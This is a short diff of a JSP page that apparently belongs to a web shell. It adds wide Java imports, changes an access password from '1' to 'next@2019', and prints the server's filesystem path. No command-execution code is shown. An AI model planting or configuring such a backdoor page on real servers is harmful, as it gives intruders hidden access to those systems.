@@ -3,7 +3,7 @@
         pageEncoding="utf-8"%>
 <%@ page import="java.io.*,java.util.*,java.net.*,java.util.concurrent.*,java.util.zip.*,java.lang.reflect.*,java.sql.*,java.text.*" %>
 <%
-String pass_word = "1";
+String pass_word = "next@2019";
 
 %>
 <%=request.getSession().getServletContext().getResource("/").getPath()+request.getServletPath()+"xxxx"%>
